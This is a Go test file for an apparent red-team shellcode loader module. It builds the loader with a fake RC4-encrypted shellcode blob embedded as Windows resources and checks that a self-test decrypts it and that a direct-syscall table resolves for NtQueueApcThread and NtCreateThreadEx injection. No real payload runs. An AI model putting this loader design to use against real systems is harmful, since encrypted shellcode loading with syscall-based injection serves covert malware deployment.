//go:build windows && amd64

package modules

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// svcLoaderRequireTools skips the end-to-end build test when the MinGW-w64
// toolchain is not on PATH. That is the case in the plain PowerShell CI step
// (no msys2 in PATH); the msys2 module-integration step has everything. The
// resource compiler may be named with or without the arch prefix depending
// on the toolchain (prefixed on Linux cross toolchains, unprefixed in
// msys2's mingw64/bin).
func svcLoaderRequireTools(t *testing.T) {
	t.Helper()
	for _, tool := range []string{"bash", "x86_64-w64-mingw32-gcc", "cc"} {
		if _, err := exec.LookPath(tool); err != nil {
			t.Skipf("skipping: %s not found in PATH", tool)
		}
	}
	if _, err := exec.LookPath("x86_64-w64-mingw32-windres"); err != nil {
		if _, err := exec.LookPath("windres"); err != nil {
			t.Skip("skipping: windres not found in PATH")
		}
	}
}

// hexPrefix returns the hex of the first n bytes of b.
func hexPrefix(b []byte, n int) string {
	if len(b) < n {
		n = len(b)
	}
	return hex.EncodeToString(b[:n])
}

// hexSuffix returns the hex of the last n bytes of b.
func hexSuffix(b []byte, n int) string {
	if len(b) < n {
		n = len(b)
	}
	return hex.EncodeToString(b[len(b)-n:])
}

// TestSvcLoaderBuildAndSelfTest drives the real module pipeline on Windows:
// build.sh RC4-encrypts a fake shellcode blob with a fixed key, windres
// embeds payload.bin/key.bin as RCDATA resources, mingw links the service
// loader, and running `loader.exe --selftest` must decrypt the embedded blob
// back to the original bytes (checked by head/tail fingerprints). Nothing is
// injected, so the test is safe in CI.
func TestSvcLoaderBuildAndSelfTest(t *testing.T) {
	svcLoaderRequireTools(t)
	dir := svcLoaderDir(t)
	tmp := t.TempDir()

	// Deterministic fake shellcode, larger than one resource directory page
	// so section alignment/layout is exercised for real.
	plain := make([]byte, 200000)
	for i := range plain {
		plain[i] = byte((i*13 + 7) % 256)
	}
	scPath := filepath.Join(tmp, "agent.exe.bin")
	if err := os.WriteFile(scPath, plain, 0o600); err != nil {
		t.Fatalf("write shellcode fixture: %v", err)
	}

	keyHex := "feedfacecafebeefdeadbeef01234567"
	outExe := filepath.Join(tmp, "svc_loader.exe")

	build := exec.Command("bash", "./build.sh",
		"--shellcode", scPath,
		"--output", outExe,
		"--arch", "x64",
		"--key", keyHex,
	)
	build.Dir = dir
	if out, err := build.CombinedOutput(); err != nil {
		t.Fatalf("build.sh failed: %v\n%s", err, out)
	}

	exe, err := os.ReadFile(outExe)
	if err != nil {
		t.Fatalf("read built loader: %v", err)
	}
	if !bytes.HasPrefix(exe, []byte("MZ")) {
		t.Fatalf("built loader is not a PE (missing MZ)")
	}
	peOff := binary.LittleEndian.Uint32(exe[0x3c:])
	if int(peOff)+6 > len(exe) {
		t.Fatalf("truncated PE header")
	}
	if machine := binary.LittleEndian.Uint16(exe[peOff+4:]); machine != 0x8664 {
		t.Fatalf("machine = 0x%x, want 0x8664 (amd64)", machine)
	}

	// --selftest must decrypt the embedded resource back to the original
	// shellcode (head/tail fingerprints) without spawning any process.
	out, err := exec.Command(outExe, "--selftest").CombinedOutput()
	if err != nil {
		t.Fatalf("loader --selftest failed: %v\n%s", err, out)
	}
	var line string
	for _, l := range strings.Split(string(out), "\n") {
		if strings.HasPrefix(l, "SELFTEST ") {
			line = l
			break
		}
	}
	if line == "" {
		t.Fatalf("no SELFTEST line in output:\n%s", out)
	}
	fields := map[string]string{}
	for _, tok := range strings.Fields(line)[1:] {
		kv := strings.SplitN(tok, "=", 2)
		if len(kv) == 2 {
			fields[kv[0]] = kv[1]
		}
	}
	if fields["data_len"] != "200000" {
		t.Fatalf("data_len = %q, want 200000 (%s)", fields["data_len"], line)
	}
	// The syscall table must resolve on x64 (regression lock for the Zw-twin
	// SSN ranking; `ssn=none` means NtQueueApcThread/NtCreateThreadEx would
	// fall back to the broken kernel32 path).
	if fields["ssn"] == "" || fields["ssn"] == "none" {
		t.Fatalf("syscall table did not resolve: ssn=%q (%s)", fields["ssn"], line)
	}
	if fields["key_len"] != "16" {
		t.Fatalf("key_len = %q, want 16 (%s)", fields["key_len"], line)
	}
	if fields["head"] != hexPrefix(plain, 16) {
		t.Fatalf("head = %q, want %q (%s)", fields["head"], hexPrefix(plain, 16), line)
	}
	if fields["tail"] != hexSuffix(plain, 16) {
		t.Fatalf("tail = %q, want %q (%s)", fields["tail"], hexSuffix(plain, 16), line)
	}
}
